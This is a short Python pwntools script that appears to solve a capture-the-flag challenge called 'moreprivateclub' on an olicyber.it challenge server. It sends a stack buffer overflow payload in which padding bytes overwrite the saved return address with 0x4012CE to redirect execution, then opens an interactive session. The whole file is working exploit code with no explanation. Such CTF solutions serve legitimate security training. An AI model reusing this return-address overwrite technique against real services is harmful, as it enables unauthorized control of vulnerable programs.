from pwn import *

if args.REMOTE:
    r = remote('moreprivateclub.challs.olicyber.it', 10016)
else:
    r = gdb.debug('./moreprivateclub', '''
        b *main
        continue
    ''')
    
print(p64(0x4012CE).hex())
r.sendlineafter(b'?', b'1234')
r.sendlineafter(b'?', b'a'*35 + b'b'*12 + b'e'*8 + p64(0x4012CE))
r.interactive() 